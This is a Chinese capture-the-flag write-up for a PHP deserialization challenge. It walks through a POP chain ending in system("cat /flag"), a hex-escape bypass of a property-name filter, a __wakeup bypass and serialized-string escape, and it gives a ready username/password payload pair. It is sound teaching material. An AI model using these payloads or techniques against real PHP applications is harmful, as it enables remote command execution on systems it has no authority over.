# web辅助

> 分类：Web

## 题目描述

PHP 反序列化 POP 链。对象属性名被过滤（name），需用 `\6e\61\6d\65` 绕过，且存在字符串逃逸。

## 考察知识点

- PHP 反序列化 POP 链
- 属性名过滤绕过（\x 编码）
- 字符串逃逸

## 解法

**POP 链**：`topsolo::__destruct -> TP -> $name() -> midsolo::__invoke -> Gank -> stristr($this->name, 'Yasuo') -> jungle::__toString -> KS(system("cat /flag"))`

关键点：
1. `midsolo::__wakeup` 限制 name 必须为 'Yasuo'，老考点（属性数量绕过）。
2. 属性名 `name` 被过滤（`stristr($data, 'name')`），用 `\6e\61\6d\65`（即 name 的十六进制转义）绕过。
3. 对象逃逸：`file_put_contents("caches/".md5($_SERVER['REMOTE_ADDR']), write(serialize($player)))`，需构造字符串逃逸才能反序列化目标对象。

构造：

```php
$user = '0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0';
$pass = '0";s:7:"\0*\0pass";O:7:"topsolo":1:{S:7:"\0*\0\6e\61\6d\65";O:7:"midsolo":2:{S:7:"\0*\0\6e\61\6d\65";O:6:"jungle":1:{S:7:"\0*\0\6e\61\6d\65";s:7:"Lee Sin";}}}};';
```

访问 `?username=...&password=...` 后，再访问 `play.php` 触发反序列化获取 flag。

## 参考答案

（flag 通过反序列化 POP 链执行 system("cat /flag")）

## 来源

- 作者：一叶飘零 | https://www.4hou.com/posts/yMvW
